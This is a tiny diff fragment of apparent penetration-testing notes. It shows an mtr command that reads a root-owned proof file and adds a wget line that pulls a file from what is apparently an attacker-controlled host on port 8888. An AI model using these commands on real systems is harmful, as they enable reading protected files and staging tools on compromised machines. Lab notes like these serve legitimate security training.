@@ -19,7 +19,7 @@ mtr --raw -F /root/proof.txt
 ```
 
 ```
-
+wget http://192.168.45.224:8888/[file]
 ```
 
 ```
